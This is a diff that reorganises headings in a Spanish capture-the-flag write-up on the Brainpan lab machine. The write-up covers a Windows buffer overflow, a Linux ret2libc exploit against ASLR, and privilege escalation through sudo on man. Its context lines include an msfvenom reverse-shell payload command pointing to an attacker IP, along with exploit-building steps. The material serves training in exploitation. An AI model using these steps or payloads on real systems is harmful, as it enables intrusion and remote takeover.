@@ -34,21 +34,28 @@ Posteriormente, para escalar a root debemos ejecutar un binario personlizado que
 Sin embargo, me di cuenta de que nadie más ha hecho un writeup que contemple este último paso solo por aprender y emplear el sistema como playground para Buffer Overflow de sistemas Linux (y con ASLR activado), así que supongo que seré el primero.
 
 # Índice
-1. [Escaneo de puertos](#escaneo-de-puertos)
-2. [Servicio HTTP](#servicio-http)
-3. [Análisis del servicio Brainpan](#analisis-del-servicio-brainpan)
-4. [Segundo apartado](#id4)
-5. [Segundo apartado](#id5)
-6. [Segundo apartado](#id6)
-7. [Segundo apartado](#id7)
-8. [Segundo apartado](#id8)
-9. [Segundo apartado](#id9)
-10. [Segundo apartado](#id10)
-11. [Segundo apartado](#id11)
-12. [Segundo apartado](#id12)
-13. [Segundo apartado](#id13)
-14. [Segundo apartado](#id14)
-15. [Segundo apartado](#id15)
+- [Introducción](#introducción)
+- [Índice](#índice)
+- [Escaneo de puertos](#escaneo-de-puertos)
+- [Servicio HTTP](#servicio-http)
+- [Análisis del servicio Brainpan](#análisis-del-servicio-brainpan)
+- [Buffer Overflow en Windows](#buffer-overflow-en-windows)
+  - [Fase de fuzzing](#fase-de-fuzzing)
+  - [Buscando el offset](#buscando-el-offset)
+  - [Encontrando los badchars](#encontrando-los-badchars)
+  - [Buscando el JMP ESP](#buscando-el-jmp-esp)
+  - [Creación del script para explotar el BoF](#creación-del-script-para-explotar-el-bof)
+- [Comprometiendo el sistema original](#comprometiendo-el-sistema-original)
+- [Obteniendo una bash](#obteniendo-una-bash)
+- [Buffer Overflow en Linux](#buffer-overflow-en-linux)
+  - [Verificando el modo de aleatorización de memoria](#verificando-el-modo-de-aleatorización-de-memoria)
+  - [Encontrando el valor del offset](#encontrando-el-valor-del-offset)
+  - [Determinando la dirección base del libc](#determinando-la-dirección-base-del-libc)
+  - [Encontrando el offset de system, exit y bash](#encontrando-el-offset-de-system-exit-y-bash)
+  - [Creación del script exploit_linux.py](#creación-del-script-exploit_linuxpy)
+- [Puesta en marcha del exploit](#puesta-en-marcha-del-exploit)
+- [Corrección para sistemas de 32 bits](#corrección-para-sistemas-de-32-bits)
+- [Escalada de privilegios por permisos SUDO en man](#escalada-de-privilegios-por-permisos-sudo-en-man)
 
 Escaneo de puertos
 ==================================================================================================================
@@ -106,7 +113,7 @@ Vemos que la entrada solicita una contraseña para acceder a lo que parece ser e
 
 Este nos responde con el mensaje **ACCESS DENIED**. Ya tenemos un caso base.
 
-Análisis del BoF y creación del exploit
+Buffer Overflow en Windows
 ==================================================================================================================
 Para corroborar eso último, mandamos una enorme cantidad de caracteres para ver si el servicio logra crashear. Se intentó con 1000 caracteres:
 
@@ -121,10 +128,12 @@ Como podemos ver, tenemos conexión con el server y este muestra en consola la c
 
 ![11]
 
+## Fase de fuzzing
 Corremos nuestro script [fuzzer.py](https://github.com/blu3ming/Buffer-Overflow-Scripts/blob/main/fuzzer.py), para encontrar el tamaño de buffer y en qué momento se sobreescribe EIP; vemos que el servicio crashea a los 600 bytes:
 
 ![12]
 
+## Buscando el offset
 Creamos ahora nuestro patrón de caracteres con ayuda de **pattern_create.rb**:
 
     /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
@@ -143,6 +152,7 @@ Colocamos "BBBB" en la variable **retn** para corroborar que podamos sobreescrib
 
 ![15]
 
+## Encontrando los badchars
 El siguiente paso es buscar los badchars del servicio. Iniciamos creando el bytearray base en mona contemplando el badchar \x00 por defecto:
 
     !mona bytearray -b "\x00"
@@ -155,12 +165,14 @@ Colocamos la cadena de bytes en nuestro script, contemplando igualmente el \x00 
 
 Como podemos observar, en la primera pasada logramos obtener **Unmodified**, por lo que no existen más badchars para este binario.
 
+## Buscando el JMP ESP
 Ahora, buscamos la dirección de la instrucción JMP ESP en el binario o su biblioteca que tenga el ASLR y SEH deshabilitados y que no contengan el badchar encontrado.
 
     !mona jmp -r esp -cpb "\x00"
 
 ![17]
 
+## Creación del script para explotar el BoF
 Copiamos la dirección encontrada en nuestro script, añadimos los NOP's y creamos nuestro payload con ayuda de msfvenom:
 
     msfvenom -p windows/shell_reverse_tcp LHOST=10.2.69.66 LPORT=443 EXITFUNC=thread -b "\x00" -f c
@@ -237,8 +249,7 @@ En este caso, copiamos el binario en nuestra máquina de atacante para poder deb
 
 ![30]
 
-Verificando el modo de aleatorización de memoria
-==================================================================================================================
+## Verificando el modo de aleatorización de memoria
 Linux tiene una forma peculiar de proteger el sistema contra Buffer Overflows, y uno de ellos es la aleatorización de registros de memoria (ASLR). Este hace que la dirección base de las bibliotecas empleadas por los binarios del sistema sea aleatoria con cada ejecución, por lo que no podemos simplemente explotar el BoF con una dirección y esperar que sea la misma en la siguiente ejecución.
 
 Recordemos que la mayor parte del sistema Unix está escrito en C, razón por la cual muchas de sus utilidades emplean la biblioteca **libc** para acceder a las instrucciones de código necesarias. Esta biblioteca es la que cambia de ubicación con cada ejecución si el ASLR está activado (valor 1 o 2), y será la misma con cada ejecución si se encuentra deshabilitado (valor 0).
@@ -251,8 +262,7 @@ Para corroborar si se encuentra habilitado o no, debemos ver el contenido del si
 
 Como podemos observar, en el sistema este se encuentra con un valor 2, lo que quiere decir que se encuentra habilitado por defecto (a efectos prácticos, 1 y 2 son lo mismo). Esto complica las cosas, pero no las imposibilita en lo absoluto, solo tendremos que notar un cierto comportamiento que esta aleatorización tiene (recordemos que en computación, no existe la aleatoriedad per se). Para lograr el Buffer Overflow en un sistema con estas características, empleamos una técnica conocida como **ret2libc**.
 
-Encontrando el valor del offset
-==================================================================================================================
+## Encontrando el valor del offset
 Igual que en un binario de Windows, primero debemos encontrar el valor del offset necesario para sobreescribir el buffer y llegar hasta el registro EIP (siguiente instrucción).
 
 Para ello, empleamos el programa **gdb** junto con la extensión **peda**. GDB viene instalado por defecto en Kali, pero *peda* deberemos instalarlo por separado con las siguientes instrucciones:
@@ -294,8 +304,7 @@ Con esto le indicamos a la herramienta que queremos realizar una consulta (-q) e
 
 Vemos que nos regresa un offset de 116, por lo que guardamos este valor por ahora.
 
-Determinando la dirección base del libc
-==================================================================================================================
+## Determinando la dirección base del libc
 Como bien se explicaba anteriormente, esta dirección cambia con cada ejecución debido a que el sistema cuenta con el ASLR activado (y la única manera de deshabilitarlo es siendo usuario root). Sin embargo, como en computación solo existe el pseudoaleatorismo, la ubicación del *libc* sigue un cierto patrón.
 
 Y es que, cada ciertas ejecuciones, la dirección se repite en ocasiones, o bien sigue un patrón determinado. Para poder consultar la dirección de esta biblioteca, ejecutamos lo siguiente:
@@ -322,8 +331,7 @@ Este archivo contendrá las direcciones del libc obtenidas con cada ejecución d
 
     uniq -D address //Imprime solo las líneas que se encuentren duplicadas en el archivo. Seleccionamos cualquiera de ellas y la guardamos por ahora.
 
-Encontrando el offset de system, exit y bash
-==================================================================================================================
+## Encontrando el offset de system, exit y bash
 A diferencia de el Buffer Overflow en Windows, aquí no necesitamos saltar al ESP ni cargar nuestro payload (eso se hace cuando no tenemos el ASLR activado). Aquí solo necesitamos hacer llamadas al sistema para poder spawnear una bash. Para ello, necesitamos de las instrucciones **system**, **exit** y, por supuesto, **/bin/bash**.
 
 Esto se debe a que en C, para spawnear una bash se requiere de un código como el que sigue:
@@ -355,7 +363,7 @@ Nótese cómo estos offsets no cambian con cada ejecución, son fijos en todo mo
 
 Estos offsets se sumarán con la dirección base del **libc** para entonces obtener su ubicación real en la memoria, y de esta manera, poder introducirlas en el buffer para que, al momento de explotar la vulnerabilidad, nos spawnee una bash.
 
-# Creación del script exploit_linux.py <a name="id12"></a>
+## Creación del script exploit_linux.py
 Nuestro script tendrá una estructura muy diferente de aquél empleado en Windows. Para ello, requerimos mandar llamar a las bibliotecas subprcess (call nos permitirá ejecutar el binario en Linux), struct (nos permitirá cargar las direcciones en Little Endian) y sys (nos permitirá cerrar el programa al terminar).
 
 Posteriormente, declaramos el offset que obtuvimos en el paso correspondiente (el primero, antes de llegar al EIP) y creamos una variable llamada junk.
@@ -390,7 +398,8 @@ Para ello, declaramos un bucle infinito (while True) y con una llamada a *call* 
 
 La base del script puedes encontrarla en mi repositorio: [exploit_linux.py](https://github.com/blu3ming/Buffer-Overflow-Scripts/blob/main/exploit_linux.py)
 
-# Puesta en marcha del exploit <a name="id13"></a>
+Puesta en marcha del exploit
+==================================================================================================================
 Ya con nuestro script listo, probamos a ejecutarlo en nuestra máquina, viendo cómo este nos devuelve una bash como el usuario root (porque con este usuario se creó en nuestra máquina).
 
 ![40]
@@ -405,7 +414,8 @@ Al momento de ejecutarlo vemos que genera errores o que nunca termina, por lo qu
 
 Esto se debe a un error de enumeración y de comprensión al momento de estudiar y desarollar un exploit para este tipo de vulnerabilidad, y es que nosotros hicimos desarrollo y pruebas en un sistema de 64 bits (nuestro Kali), cuando la máquina víctima corre un sistema de 32 bits. En teoría, nuestro script debería funcionar en cualquier sistema operativo Linux de 64 bits, pero ahora hay que hacer modificaciones para este tipo de sistema.
 
-# Corrección para sistemas de 32 bits <a name="id14"></a>
+Corrección para sistemas de 32 bits
+==================================================================================================================
 Corroboramos lo anterior tratando de determinar la ubicación del **libc** en este sistema:
 
     ldd /usr/local/bin/validate
@@ -440,7 +450,8 @@ Y listo, al ejecutarlo nos aparecerá una bash nuevamente, pero ahora como el us
 
 ![48]
 
-# Escalada de privilegios por permisos SUDO en man <a name="id15"></a>
+Escalada de privilegios por permisos SUDO en man
+==================================================================================================================
 Ya sea que hayas seguido el Buffer Overflow de Linux o solo saltado a esta parte, la forma de escalar priviegios es haciendo un listado de permisos SUDO en el sistema:
 
     sudo -l
